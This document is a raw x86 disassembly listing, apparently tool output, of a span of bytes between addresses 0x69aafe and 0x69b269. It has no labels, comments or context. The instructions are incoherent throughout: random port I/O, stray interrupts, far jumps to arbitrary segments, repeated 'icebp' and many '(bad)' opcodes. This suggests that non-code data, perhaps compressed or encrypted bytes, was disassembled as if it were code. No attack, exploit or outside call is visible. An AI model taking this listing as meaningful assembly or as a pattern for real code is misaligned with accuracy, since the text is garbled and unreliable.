  69aafe:	mov    al,ds:0xcaaaea9d
  69ab03:	push   ds
  69ab04:	mov    ebp,0xfbb0738
  69ab09:	inc    esp
  69ab0a:	mov    eax,ds:0x35e1bd99
  69ab0f:	mov    edx,0x6bb3492d
  69ab14:	int    0x59
  69ab16:	test   al,0xb2
  69ab18:	mov    ebx,0x68228e1d
  69ab1d:	jmp    0x69ab2a
  69ab1f:	data16 or al,0x8d
  69ab22:	out    0xe4,al
  69ab24:	xor    ebp,DWORD PTR [ebx+0x28]
  69ab27:	pop    ecx
  69ab28:	loope  0x69aace
  69ab2a:	mov    ebx,ecx
  69ab2c:	xlat   BYTE PTR ds:[ebx]
  69ab2d:	sub    eax,0x3940766a
  69ab32:	daa    
  69ab33:	sti    
  69ab34:	and    BYTE PTR [eax-0x6bb6cd8e],0x43
  69ab3b:	fistp  QWORD PTR [eax+0x7a]
  69ab3e:	push   edx
  69ab3f:	sbb    eax,0x836016a6
  69ab44:	stc    
  69ab45:	fadd   QWORD PTR [ecx-0x2a]
  69ab48:	mul    BYTE PTR [eax]
  69ab4a:	push   ds
  69ab4b:	inc    edi
  69ab4c:	test   BYTE PTR [ecx+edx*8],bh
  69ab4f:	and    DWORD PTR cs:[ebx+0x55806619],eax
  69ab56:	js     0x69ab78
  69ab58:	sbb    al,0xb8
  69ab5a:	inc    eax
  69ab5b:	sti    
  69ab5c:	pop    esp
  69ab5d:	mov    edx,DWORD PTR [ebp+eax*2-0x75161aad]
  69ab64:	and    al,0x11
  69ab66:	test   BYTE PTR [edx-0x1d7f8470],bl
  69ab6c:	adc    cl,BYTE PTR [edx]
  69ab6e:	sbb    BYTE PTR [ebx],bh
  69ab70:	pop    ebx
  69ab71:	push   esp
  69ab72:	rcl    BYTE PTR [esi],0x2
  69ab75:	outs   dx,DWORD PTR ds:[esi]
  69ab76:	sub    BYTE PTR [ebx],dh
  69ab78:	fsub   DWORD PTR [eax+0x6d9c0828]
  69ab7e:	xchg   DWORD PTR [esi-0x4d],edi
  69ab81:	nop
  69ab82:	sub    al,0x13
  69ab84:	je     0x69ab0c
  69ab86:	cs pop eax
  69ab88:	js     0x69ab2b
  69ab8a:	aam    0x45
  69ab8c:	outs   dx,BYTE PTR ds:[esi]
  69ab8d:	ins    BYTE PTR es:[edi],dx
  69ab8e:	add    DWORD PTR [eax-0x3e52cd17],esi
  69ab94:	pop    eax
  69ab95:	gs cmp al,0x63
  69ab98:	xchg   ebx,eax
  69ab99:	aad    0x7e
  69ab9b:	lods   al,BYTE PTR ds:[esi]
  69ab9c:	(bad)  
  69ab9d:	mov    bh,dh
  69ab9f:	std    
  69aba0:	dec    ebx
  69aba1:	xor    eax,0x28175a0
  69aba6:	ror    BYTE PTR [edi+0x2c],cl
  69aba9:	pop    edi
  69abaa:	in     eax,dx
  69abab:	inc    ebx
  69abac:	add    DWORD PTR [ecx+0x13],ebp
  69abaf:	lods   eax,DWORD PTR ds:[esi]
  69abb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69abb1:	mov    esi,0x877c170
  69abb6:	inc    eax
  69abb7:	or     ch,BYTE PTR [edx]
  69abb9:	xchg   edi,eax
  69abba:	aaa    
  69abbb:	pop    ebp
  69abbc:	retf   0xa110
  69abbf:	(bad)  
  69abc0:	in     eax,0xd4
  69abc2:	fisttp WORD PTR [ebx+0x102db4be]
  69abc8:	xor    al,0x8b
  69abca:	stos   DWORD PTR es:[edi],eax
  69abcb:	int    0x94
  69abcd:	je     0x69ab77
  69abcf:	imul   BYTE PTR [esi]
  69abd1:	sub    BYTE PTR [edx+0x4e14712a],cl
  69abd7:	sbb    esp,ebx
  69abd9:	lds    edi,FWORD PTR [edx-0x1535444a]
  69abdf:	and    al,bl
  69abe1:	rcl    DWORD PTR [edi+0x747d4afb],cl
  69abe7:	pop    esi
  69abe8:	test   al,0xfa
  69abea:	add    dh,BYTE PTR [ecx+esi*8-0x53]
  69abee:	scas   eax,DWORD PTR es:[edi]
  69abef:	lock outs dx,DWORD PTR ds:[esi]
  69abf1:	xchg   esp,eax
  69abf2:	add    DWORD PTR [edi-0x1b],ebp
  69abf5:	dec    ebx
  69abf6:	and    cl,BYTE PTR [edi-0x3f]
  69abf9:	ss adc bl,BYTE PTR es:[eax-0x22]
  69abfe:	test   BYTE PTR [ecx-0x8],bl
  69ac01:	nop
  69ac02:	push   esi
  69ac03:	and    bl,dh
  69ac05:	int    0xf8
  69ac07:	inc    esp
  69ac08:	mov    ebx,esp
  69ac0a:	mov    bh,0xd0
  69ac0c:	dec    edx
  69ac0d:	ss add al,0x53
  69ac10:	push   eax
  69ac11:	in     eax,0xfb
  69ac13:	adc    ecx,esi
  69ac15:	cld    
  69ac16:	pop    eax
  69ac17:	int    0x47
  69ac19:	inc    esi
  69ac1a:	push   ebp
  69ac1b:	aad    0x6c
  69ac1d:	dec    esp
  69ac1e:	jg     0x69ac49
  69ac20:	jae    0x69aba4
  69ac22:	sahf   
  69ac23:	(bad)  [eax-0x4]
  69ac26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69ac27:	inc    ebp
  69ac28:	leave  
  69ac29:	loopne 0x69abfc
  69ac2b:	out    dx,al
  69ac2c:	or     eax,0xc532cd48
  69ac31:	pop    eax
  69ac32:	or     ebp,DWORD PTR [eax-0x601eb3b3]
  69ac38:	mov    ch,0xd4
  69ac3a:	popf   
  69ac3b:	jge    0x69ac7d
  69ac3d:	jl     0x69ac56
  69ac3f:	and    eax,0x3b13d0ae
  69ac44:	pop    ss
  69ac45:	mov    al,ds:0x8016320e
  69ac4a:	and    eax,0x8dea415d
  69ac4f:	or     bh,0x80
  69ac52:	xor    eax,0x5148ca6
  69ac57:	sbb    ah,BYTE PTR [edi+esi*8+0xab3c21a]
  69ac5e:	xor    BYTE PTR [edx-0x2],bl
  69ac61:	dec    esp
  69ac62:	leave  
  69ac63:	inc    ebx
  69ac64:	fcomp  DWORD PTR [edx+eiz*4]
  69ac67:	xor    DWORD PTR [edi+0x332402de],ecx
  69ac6d:	push   edx
  69ac6e:	cwde   
  69ac6f:	sub    BYTE PTR [eax],0xe7
  69ac72:	fdiv   DWORD PTR [edi-0x35]
  69ac75:	cli    
  69ac76:	inc    edi
  69ac77:	hlt    
  69ac78:	retf   0xc37
  69ac7b:	(bad)  
  69ac7c:	into   
  69ac7d:	gs jbe 0x69acee
  69ac80:	push   esi
  69ac81:	sbb    BYTE PTR [ebx-0x2b],cl
  69ac84:	in     eax,0x9c
  69ac86:	lock imul ebx,eax,0x4a
  69ac8a:	call   0x693b:0x1a680331
  69ac91:	sub    al,0xaf
  69ac93:	add    ecx,DWORD PTR [ecx+edx*1+0x27]
  69ac97:	dec    esi
  69ac98:	xor    dh,cl
  69ac9a:	and    al,0xf6
  69ac9c:	das    
  69ac9d:	jbe    0x69acc1
  69ac9f:	push   esp
  69aca0:	ja     0x69ac2f
  69aca2:	add    DWORD PTR ds:0xab7bde7b,ecx
  69aca8:	mov    bh,0xb6
  69acaa:	leave  
  69acab:	les    esp,FWORD PTR [eax-0x49]
  69acae:	mov    ah,0xb1
  69acb0:	xor    BYTE PTR [edi+0x52788298],0xa9
  69acb7:	mov    gs,WORD PTR [esi-0x73b7e5b7]
  69acbd:	data16 loop 0x69ad06
  69acc0:	popf   
  69acc1:	or     al,0x79
  69acc3:	leave  
  69acc4:	push   es
  69acc5:	aam    0x81
  69acc7:	je     0x69ad1a
  69acc9:	jmp    0x4c0fb651
  69acce:	stos   BYTE PTR es:[edi],al
  69accf:	pop    ss
  69acd0:	cli    
  69acd1:	xchg   ecx,esi
  69acd3:	jne    0x69ace0
  69acd5:	and    al,BYTE PTR ds:0x975da508
  69acdb:	mov    ds:0xd156622c,eax
  69ace0:	mov    ebp,0xa0f1734b
  69ace5:	xor    BYTE PTR [esi+0x81aa839],bl
  69aceb:	outs   dx,BYTE PTR ds:[esi]
  69acec:	add    edi,DWORD PTR [eax-0x9c82930]
  69acf2:	jb     0x69ad4b
  69acf4:	xor    dl,al
  69acf6:	mov    ch,0x3e
  69acf8:	fnsave [edi-0x63]
  69acfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69acfc:	inc    eax
  69acfd:	ret    0xfb62
  69ad00:	sub    DWORD PTR [edx+0x0],esp
  69ad03:	ss (bad) 
  69ad05:	jg     0x69ad6c
  69ad07:	cmc    
  69ad08:	mov    dh,BYTE PTR [ebx-0x61a5c044]
  69ad0e:	div    BYTE PTR [edi+0x55]
  69ad11:	lods   al,BYTE PTR ds:[esi]
  69ad12:	ret    0x543
  69ad15:	icebp  
  69ad16:	inc    ebp
  69ad17:	(bad)  
  69ad19:	xor    DWORD PTR [edx+0x11d2c4be],ebx
  69ad1f:	fdivrp st(2),st
  69ad21:	mov    ah,BYTE PTR [ecx+0x5fd6b143]
  69ad27:	jae    0x69ad3e
  69ad29:	inc    DWORD PTR [esi-0x55a5443e]
  69ad2f:	jae    0x69acdf
  69ad31:	jge    0x69ad33
  69ad33:	adc    DWORD PTR [ecx+ebp*1],edx
  69ad36:	cmp    dh,al
  69ad38:	or     edx,esi
  69ad3a:	and    ebp,edi
  69ad3c:	scas   eax,DWORD PTR es:[edi]
  69ad3d:	cmp    ah,dh
  69ad3f:	pushf  
  69ad40:	adc    al,0x42
  69ad42:	loope  0x69ad7e
  69ad44:	jno    0x69ad7b
  69ad46:	push   ebx
  69ad47:	inc    esp
  69ad48:	outs   dx,DWORD PTR ds:[esi]
  69ad49:	push   0xcb5c246c
  69ad4e:	add    eax,0x2c1ca57e
  69ad53:	in     al,dx
  69ad54:	mov    dh,0xf6
  69ad56:	sbb    eax,0x421f9fc7
  69ad5b:	sbb    eax,DWORD PTR [edx-0x78]
  69ad5e:	cmp    al,0xe8
  69ad60:	out    0x24,eax
  69ad62:	jae    0x69ad06
  69ad64:	outs   dx,DWORD PTR ds:[esi]
  69ad65:	scas   eax,DWORD PTR es:[edi]
  69ad66:	repz and BYTE PTR [ecx],ch
  69ad69:	pop    edi
  69ad6a:	cmp    edi,esi
  69ad6c:	rcr    BYTE PTR [edi],1
  69ad6e:	data16 (bad) 
  69ad71:	push   esp
  69ad72:	int3   
  69ad73:	loope  0x69ad8a
  69ad75:	mov    ch,BYTE PTR gs:[ecx+0x6151b749]
  69ad7c:	mov    ch,0x9f
  69ad7f:	(bad)  
  69ad80:	call   0x16ca11ed
  69ad85:	mov    edx,0xfa5e7573
  69ad8a:	call   0xd9d545e2
  69ad8f:	jne    0x69adeb
  69ad91:	fidiv  DWORD PTR [edx-0x45]
  69ad94:	mov    edx,0x69649fd4
  69ad99:	sbb    dh,BYTE PTR [eax-0x3000f720]
  69ad9f:	scas   al,BYTE PTR es:[edi]
  69ada0:	add    eax,0xa7211006
  69ada5:	inc    ebp
  69ada6:	xlat   BYTE PTR ds:[ebx]
  69ada7:	ss inc edx
  69ada9:	out    0xed,eax
  69adab:	add    al,0x3
  69adad:	cs pop ecx
  69adaf:	pop    ds
  69adb0:	sbb    al,0x5d
  69adb2:	jb     0x69ae06
  69adb4:	xchg   edi,eax
  69adb5:	addr16 adc eax,0xd6458423
  69adbb:	stc    
  69adbc:	push   eax
  69adbd:	bound  ebx,QWORD PTR [eax]
  69adbf:	hlt    
  69adc0:	push   edi
  69adc1:	retf   0x55df
  69adc4:	sbb    ch,BYTE PTR [ecx]
  69adc6:	pop    esi
  69adc7:	mov    BYTE PTR [edx],dh
  69adc9:	adc    ecx,ecx
  69adcb:	ss mov bl,0x6a
  69adce:	je     0x69adde
  69add0:	sbb    eax,0x62558896
  69add5:	pop    eax
  69add6:	push   ecx
  69add7:	cmp    cl,BYTE PTR [edx]
  69add9:	fwait
  69adda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69addb:	dec    ebp
  69addc:	mov    bh,0x15
  69adde:	je     0x69ae5b
  69ade0:	sbb    dl,BYTE PTR [ecx]
  69ade2:	fcomp  QWORD PTR [ebp+0x6e]
  69ade5:	sahf   
  69ade6:	test   eax,0x83057f40
  69adeb:	mov    edi,0xe958de3a
  69adf0:	inc    ebx
  69adf1:	repnz push 0xfd54647e
  69adf7:	inc    ecx
  69adf8:	add    eax,0xacd852d
  69adfd:	mov    cl,0x4d
  69adff:	rcr    eax,1
  69ae01:	imul   esp,DWORD PTR [ecx*1+0x39e4dcc1],0xc0618fba
  69ae0c:	push   ebp
  69ae0d:	test   DWORD PTR [ecx],edx
  69ae0f:	imul   eax,DWORD PTR [edx+esi*1],0x26
  69ae13:	adc    BYTE PTR [esi-0x598cee8a],ah
  69ae19:	adc    al,0xf5
  69ae1b:	xor    BYTE PTR [ebp+0x6c],ch
  69ae1e:	sub    esp,DWORD PTR [ebx-0x1077c3dc]
  69ae24:	test   eax,0x348998b5
  69ae29:	add    eax,0x485ac2cd
  69ae2e:	lea    esi,[ebp+edi*4+0x15]
  69ae32:	cs inc esi
  69ae34:	add    dh,dh
  69ae36:	mov    ds:0x1c44eeb,eax
  69ae3b:	sar    DWORD PTR [edx-0x30b3db74],0x2f
  69ae42:	sub    al,0x38
  69ae44:	cmp    al,0xe6
  69ae46:	push   ds
  69ae47:	inc    edi
  69ae48:	clc    
  69ae49:	push   edx
  69ae4a:	mov    BYTE PTR [edi-0x32243cca],ah
  69ae50:	shr    BYTE PTR ds:0x15b3b86a,0x3
  69ae57:	mov    ds:0x7780b878,al
  69ae5c:	in     eax,0xa5
  69ae5e:	sbb    BYTE PTR [ebp-0x3c1c89a2],bh
  69ae64:	imul   DWORD PTR [ecx+ecx*2+0x4012e0a2]
  69ae6b:	mov    BYTE PTR [esi-0x7c68b669],dl
  69ae71:	hlt    
  69ae72:	adc    eax,0x29c5ba50
  69ae77:	fmul   QWORD PTR [ecx-0xb2d14dd]
  69ae7d:	mov    bh,0xe3
  69ae7f:	push   ebx
  69ae80:	aaa    
  69ae81:	ins    BYTE PTR es:[edi],dx
  69ae82:	aam    0xd2
  69ae84:	jg     0x69ae32
  69ae86:	call   0x965c:0x9da4f50f
  69ae8d:	mov    ecx,0x63918136
  69ae92:	pop    esp
  69ae93:	shl    DWORD PTR [ebx-0x2c484a9c],cl
  69ae99:	pop    eax
  69ae9a:	fabs   
  69ae9c:	in     eax,dx
  69ae9d:	inc    eax
  69ae9e:	push   eax
  69ae9f:	sbb    BYTE PTR [ebx+0x4d0895a0],bh
  69aea5:	icebp  
  69aea6:	(bad)  
  69aea7:	jg     0x69af02
  69aea9:	sti    
  69aeaa:	add    al,dh
  69aeac:	mov    BYTE PTR [ebp+0x4e7bf923],ah
  69aeb2:	in     al,dx
  69aeb3:	sbb    al,0x15
  69aeb5:	pushf  
  69aeb6:	mov    ds:0xe840ed72,al
  69aebb:	sbb    dl,BYTE PTR [edi]
  69aebd:	aas    
  69aebe:	jbe    0x69ae74
  69aec0:	dec    esi
  69aec1:	mov    bl,0xf
  69aec3:	into   
  69aec4:	ror    DWORD PTR [ebx-0x5dbbedf4],0x58
  69aecb:	sub    al,bl
  69aecd:	imul   edi,DWORD PTR [ecx+eiz*2-0x4d49fcde],0xffffffb3
  69aed5:	mov    al,0xaa
  69aed7:	out    0xfc,eax
  69aed9:	or     al,0x93
  69aedb:	mov    eax,ds:0xbfbfccbe
  69aee0:	int3   
  69aee1:	push   ss
  69aee2:	sbb    bh,dl
  69aee4:	arpl   WORD PTR [eax-0x7f4f205e],ax
  69aeea:	xchg   esp,eax
  69aeeb:	adc    al,0x1a
  69aeed:	mov    al,0xdd
  69aeef:	and    BYTE PTR [eax+0x2cbd7b98],ah
  69aef5:	cwde   
  69aef6:	test   al,0xd1
  69aef8:	repnz pop esp
  69aefa:	fiadd  WORD PTR [esi-0x1b]
  69aefd:	fstp   DWORD PTR [ebx+0x5e]
  69af00:	mov    eax,0xe7642894
  69af05:	into   
  69af06:	imul   edi,DWORD PTR [ebx-0x59],0x79cb32a2
  69af0d:	mov    ebp,0xdf34ace6
  69af12:	inc    ebp
  69af13:	mov    ds:0x1d57ceb7,al
  69af18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69af19:	inc    eax
  69af1a:	add    eax,0x45142f15
  69af1f:	pop    ebp
  69af20:	rcr    BYTE PTR [ebx],1
  69af22:	rcl    DWORD PTR [ebp+0x66],cl
  69af25:	stos   DWORD PTR es:[edi],eax
  69af26:	icebp  
  69af27:	xor    DWORD PTR [bx],ebx
  69af2a:	scas   eax,DWORD PTR es:[edi]
  69af2b:	jge    0x69afa9
  69af2d:	test   al,0x3a
  69af2f:	lea    edi,ds:0xd52cd2a0
  69af35:	rol    ch,cl
  69af37:	mov    esi,0x6eef7c64
  69af3c:	push   ebp
  69af3d:	(bad)  
  69af3e:	(bad)  
  69af3f:	out    0xcc,al
  69af41:	mov    cl,0x44
  69af43:	or     DWORD PTR [ebp+0x15],0x3600b277
  69af4a:	stos   DWORD PTR es:[edi],eax
  69af4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69af4c:	xor    ecx,DWORD PTR [edx]
  69af4e:	mov    fs,WORD PTR [ebp-0x74]
  69af51:	or     BYTE PTR [eax-0x24],al
  69af54:	push   esp
  69af55:	scas   eax,DWORD PTR es:[edi]
  69af56:	xor    cl,BYTE PTR [edx]
  69af58:	je     0x69aefd
  69af5a:	pop    eax
  69af5b:	xchg   ebp,eax
  69af5c:	fcmovne st,st(7)
  69af5e:	push   0x3029035d
  69af63:	inc    eax
  69af64:	or     bh,BYTE PTR [ebx]
  69af66:	cli    
  69af67:	and    al,0x43
  69af69:	cdq    
  69af6a:	cli    
  69af6b:	jno    0x69afa7
  69af6d:	xchg   edi,eax
  69af6e:	nop
  69af6f:	sbb    eax,0x246a91b5
  69af74:	pop    edx
  69af75:	push   esi
  69af76:	aam    0x29
  69af78:	mov    ebx,0x34026c5c
  69af7d:	sub    al,0x69
  69af7f:	xor    al,BYTE PTR [esi-0x5e]
  69af82:	sbb    eax,0x733c4f3a
  69af87:	pop    eax
  69af88:	outs   dx,DWORD PTR ds:[esi]
  69af89:	mov    ds:0x27d4eaf3,al
  69af8e:	retf   0xa7b8
  69af91:	and    al,0x49
  69af93:	std    
  69af94:	cld    
  69af95:	push   0x5780b6d9
  69af9a:	push   0x4e0466ba
  69af9f:	jg     0x69af47
  69afa1:	mov    ecx,0x7e932014
  69afa6:	mov    WORD PTR [ebp-0x72],di
  69afaa:	mov    esi,0xfab07f8c
  69afaf:	ret    0xc32e
  69afb2:	adc    bh,bl
  69afb4:	stc    
  69afb5:	pop    ebp
  69afb6:	push   ds
  69afb7:	xchg   edx,eax
  69afb8:	fwait
  69afb9:	push   ss
  69afba:	fmul   DWORD PTR [ebp-0x3c2a336d]
  69afc0:	fst    st(3)
  69afc2:	sbb    DWORD PTR [eax-0x47b4c33c],ebp
  69afc8:	mov    eax,0x31417aa0
  69afcd:	pop    edi
  69afce:	xchg   esp,eax
  69afcf:	outs   dx,DWORD PTR ds:[esi]
  69afd0:	lahf   
  69afd1:	or     dl,BYTE PTR [edx+ecx*2+0x54f3f8b7]
  69afd8:	push   edx
  69afd9:	nop
  69afda:	or     eax,0x28c4367e
  69afdf:	and    BYTE PTR [ecx-0x22e54354],dl
  69afe5:	xchg   edi,eax
  69afe6:	retf   0xda22
  69afe9:	cmp    al,0x9e
  69afeb:	sub    cl,ah
  69afed:	inc    ebx
  69afee:	(bad)  
  69afef:	mov    ebp,0x7e4eec74
  69aff4:	mov    bl,0xef
  69aff6:	add    ebp,DWORD PTR [ebp-0x190750ed]
  69affc:	xchg   ebp,eax
  69affd:	imul   BYTE PTR [ebx+0x5afa63cb]
  69b003:	dec    eax
  69b004:	jmp    0x15ae51a9
  69b009:	fwait
  69b00a:	rcl    ecx,1
  69b00c:	cmc    
  69b00d:	mov    bh,0x6
  69b00f:	cmp    ah,ch
  69b011:	push   ss
  69b012:	jl     0x69b01d
  69b014:	in     eax,dx
  69b015:	lods   al,BYTE PTR ds:[esi]
  69b016:	mov    ah,0x85
  69b018:	sbb    edi,DWORD PTR [ebx]
  69b01a:	jns    0x69b012
  69b01c:	loop   0x69b065
  69b01e:	test   DWORD PTR [eax],edi
  69b020:	mov    al,ds:0x75802448
  69b025:	test   ebx,ebx
  69b027:	dec    edi
  69b028:	or     ebx,0xd04dc976
  69b02e:	in     eax,0xb9
  69b030:	jb     0x69b02a
  69b032:	retf   
  69b033:	jmp    0x69b0a5
  69b035:	(bad)  
  69b036:	dec    ebp
  69b037:	jle    0x69b043
  69b039:	dec    BYTE PTR [ecx]
  69b03b:	mov    al,ds:0xcc07915a
  69b040:	xchg   DWORD PTR [ebx+0x3d29877c],ecx
  69b046:	jmp    0x69b070
  69b048:	lods   eax,DWORD PTR ds:[esi]
  69b049:	jle    0x69afe3
  69b04b:	cmp    BYTE PTR [ebp-0x1f],bl
  69b04e:	aas    
  69b04f:	ins    DWORD PTR es:[edi],dx
  69b050:	ret    
  69b051:	int    0xd2
  69b053:	xor    BYTE PTR [ebp-0x1c],dl
  69b056:	nop
  69b057:	inc    ebx
  69b058:	dec    edx
  69b059:	add    al,0x1e
  69b05b:	sub    eax,0xf05b3fba
  69b060:	pushf  
  69b061:	and    esi,DWORD PTR [ebp+0x9]
  69b064:	dec    BYTE PTR ds:0x1c409a93
  69b06a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69b06b:	or     BYTE PTR [ebp-0x4ee0ddef],ch
  69b071:	add    BYTE PTR [edx+0x25cf6fce],dh
  69b077:	jnp    0x69b03a
  69b079:	jnp    0x69b0ca
  69b07b:	xor    ebp,DWORD PTR [edx]
  69b07d:	cdq    
  69b07e:	pop    esp
  69b07f:	mov    edx,0xa0c497be
  69b084:	adc    esi,DWORD PTR [esi]
  69b086:	jmp    0x69b094
  69b088:	rol    BYTE PTR [ecx+0x2a],1
  69b08b:	or     al,0xfc
  69b08d:	test   DWORD PTR [edi],ecx
  69b08f:	sbb    al,0xc0
  69b091:	pop    es
  69b092:	lods   eax,DWORD PTR ds:[esi]
  69b093:	das    
  69b094:	ins    DWORD PTR es:[edi],dx
  69b095:	pop    eax
  69b096:	jb     0x69b063
  69b098:	imul   DWORD PTR [ebx]
  69b09a:	icebp  
  69b09b:	(bad)  
  69b09c:	not    BYTE PTR [edx-0xf34936b]
  69b0a2:	jmp    0xd71:0x1ef74305
  69b0a9:	fild   QWORD PTR [edx-0x290b1406]
  69b0af:	xor    cl,BYTE PTR [ebx+0x32a7cce]
  69b0b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69b0b6:	(bad)  
  69b0b7:	pop    esp
  69b0b8:	add    cl,BYTE PTR ds:[ebp-0x69]
  69b0bc:	leave  
  69b0bd:	popa   
  69b0be:	stc    
  69b0bf:	xchg   ch,dh
  69b0c1:	stos   BYTE PTR es:[edi],al
  69b0c2:	mov    ds:0xae430ffc,al
  69b0c7:	jne    0x69b134
  69b0c9:	adc    al,0x61
  69b0cb:	stos   BYTE PTR es:[edi],al
  69b0cc:	test   al,0x8b
  69b0ce:	std    
  69b0cf:	pop    ss
  69b0d0:	sub    eax,0x1cbdb1ed
  69b0d5:	sub    eax,0xdfa203fd
  69b0da:	ins    DWORD PTR es:[edi],dx
  69b0db:	lahf   
  69b0dc:	or     eax,0x7f7ec9de
  69b0e1:	leave  
  69b0e2:	sub    eax,0xa4cb98e1
  69b0e7:	sbb    al,0x53
  69b0e9:	xchg   esi,eax
  69b0ea:	jmp    0x2fd2:0x34c2107c
  69b0f1:	xor    eax,0xfa7dedca
  69b0f6:	add    al,0x82
  69b0f8:	out    0x71,al
  69b0fa:	xchg   esp,eax
  69b0fb:	arpl   WORD PTR [ebx-0x5a],ax
  69b0fe:	cwde   
  69b0ff:	(bad)  
  69b100:	inc    ebp
  69b101:	pusha  
  69b102:	jno    0x69b094
  69b104:	push   cs
  69b105:	aas    
  69b106:	sar    BYTE PTR [ecx-0x24],0xa8
  69b10a:	xchg   ebx,eax
  69b10b:	adc    eax,0x5c38dcb1
  69b110:	ins    BYTE PTR es:[edi],dx
  69b111:	pop    esi
  69b112:	ins    DWORD PTR es:[edi],dx
  69b113:	sti    
  69b114:	xchg   edx,esp
  69b116:	not    DWORD PTR [edx]
  69b118:	dec    ebp
  69b119:	mov    ds:0x53267872,eax
  69b11e:	jae    0x69b154
  69b120:	xchg   ecx,eax
  69b121:	sti    
  69b122:	xchg   edi,eax
  69b123:	sub    eax,0x7ac226ad
  69b128:	sbb    bl,al
  69b12a:	fucom  st(0)
  69b12c:	inc    esi
  69b12d:	add    al,0x68
  69b12f:	push   es
  69b130:	enter  0xb259,0x1d
  69b134:	iret   
  69b135:	imul   edx,DWORD PTR [edi+0x73],0x79cc121c
  69b13c:	enter  0x1f10,0x1
  69b140:	dec    ecx
  69b141:	push   ebx
  69b142:	loopne 0x69b0d3
  69b144:	fsub   DWORD PTR [edx-0x4f4e7ee7]
  69b14a:	ret    0xc73c
  69b14d:	fwait
  69b14e:	pop    ss
  69b14f:	fidiv  DWORD PTR [edx]
  69b151:	imul   BYTE PTR [ebp-0x14e67d17]
  69b157:	push   eax
  69b158:	bound  eax,QWORD PTR [esi]
  69b15a:	gs xor bl,0xb4
  69b15e:	sub    al,0xba
  69b160:	in     al,0x76
  69b162:	fmulp  st(6),st
  69b164:	mov    ebp,0x5c6d624e
  69b169:	mov    al,ch
  69b16b:	xchg   BYTE PTR [ecx+0x49],ah
  69b16e:	cli    
  69b16f:	inc    ecx
  69b170:	pop    ebp
  69b171:	cwde   
  69b172:	(bad)  
  69b173:	int3   
  69b174:	ds sti 
  69b176:	jne    0x69b1d3
  69b178:	pop    esi
  69b179:	dec    ebx
  69b17a:	and    DWORD PTR [esi+0x5ce847a1],ebx
  69b180:	jle    0x69b1a6
  69b182:	add    DWORD PTR [esi],ecx
  69b184:	pop    edi
  69b185:	mov    ebp,0x2bec289d
  69b18a:	repnz nop
  69b18c:	das    
  69b18d:	addr16 je 0x69b11b
  69b190:	clc    
  69b191:	bound  esp,QWORD PTR [esi]
  69b193:	nop
  69b194:	adc    edx,DWORD PTR [ebx+0x26]
  69b197:	push   cs
  69b198:	ficomp DWORD PTR [esi]
  69b19a:	pop    esp
  69b19b:	ret    0x662c
  69b19e:	loope  0x69b13a
  69b1a0:	popa   
  69b1a1:	adc    ecx,0x67
  69b1a4:	xchg   ch,dh
  69b1a6:	leave  
  69b1a7:	add    BYTE PTR [edi],0xee
  69b1aa:	cdq    
  69b1ab:	push   es
  69b1ac:	xchg   BYTE PTR [esi],ch
  69b1ae:	jnp    0x69b219
  69b1b0:	cli    
  69b1b1:	dec    edi
  69b1b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69b1b3:	int    0xe2
  69b1b5:	or     eax,0x6d02171f
  69b1ba:	mov    esp,0x8c054ec3
  69b1bf:	inc    ebp
  69b1c0:	jmp    0x69b206
  69b1c2:	add    ebx,DWORD PTR [edx+edx*4]
  69b1c5:	in     al,0x1e
  69b1c7:	xor    al,0xaf
  69b1c9:	cwde   
  69b1ca:	mov    al,0xf
  69b1cc:	icebp  
  69b1cd:	into   
  69b1ce:	sbb    BYTE PTR [ecx],dl
  69b1d0:	int3   
  69b1d1:	lock or eax,0x8127c1f2
  69b1d7:	and    eax,0xe76e9d0e
  69b1dc:	xchg   edi,eax
  69b1dd:	pop    ecx
  69b1de:	loop   0x69b1fc
  69b1e0:	or     BYTE PTR [ebx-0x31],0x6b
  69b1e4:	mov    eax,0xc0523155
  69b1e9:	(bad)  
  69b1ea:	or     BYTE PTR [ebp+0x7],ch
  69b1ed:	sub    edx,0x754bce66
  69b1f3:	xor    DWORD PTR [ecx],esp
  69b1f5:	stos   DWORD PTR es:[edi],eax
  69b1f6:	ds mov dh,0x94
  69b1f9:	xor    ebx,DWORD PTR [ebx]
  69b1fb:	mov    bl,0xbe
  69b1fd:	fs mov dl,0x1c
  69b200:	push   eax
  69b201:	ret    0x214a
  69b204:	aad    0x41
  69b206:	pusha  
  69b207:	ja     0x69b1d2
  69b209:	hlt    
  69b20a:	lahf   
  69b20b:	cmp    al,0x35
  69b20d:	adc    bh,dl
  69b20f:	cmp    dl,dl
  69b211:	and    bh,ah
  69b213:	test   BYTE PTR [eax],cl
  69b215:	call   0xd0cb:0xe2e21581
  69b21c:	jp     0x69b20a
  69b21e:	les    ebp,FWORD PTR [ecx]
  69b220:	js     0x69b27a
  69b222:	stos   DWORD PTR es:[edi],eax
  69b223:	ja     0x69b1e5
  69b225:	pop    edx
  69b226:	cmp    eax,0xd2573eec
  69b22b:	mov    al,ds:0x962ea603
  69b230:	je     0x69b235
  69b232:	pop    ebx
  69b233:	or     BYTE PTR [esi+0x6a],al
  69b236:	sbb    al,0x8b
  69b238:	xchg   ebx,eax
  69b239:	mov    dl,0xe5
  69b23b:	aad    0x74
  69b23d:	in     eax,dx
  69b23e:	loope  0x69b24d
  69b240:	std    
  69b241:	and    dh,BYTE PTR [edx]
  69b243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69b244:	add    ebx,DWORD PTR [esi]
  69b246:	dec    edi
  69b247:	dec    ecx
  69b248:	mov    bl,0x2f
  69b24a:	pop    ebx
  69b24b:	out    dx,eax
  69b24c:	lahf   
  69b24d:	jge    0x69b2b0
  69b24f:	xchg   esp,eax
  69b250:	xor    edi,DWORD PTR [ecx+0x7a8769ac]
  69b256:	jmp    0x69b1fd
  69b258:	adc    dl,bl
  69b25a:	add    BYTE PTR [eax+0x11],bl
  69b25d:	mov    ecx,0xaa3c4517
  69b262:	and    ebx,edi
  69b264:	pop    ebx
  69b265:	into   
  69b266:	lods   al,BYTE PTR ds:[esi]
  69b267:	dec    eax
  69b268:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69b269:	pop    es
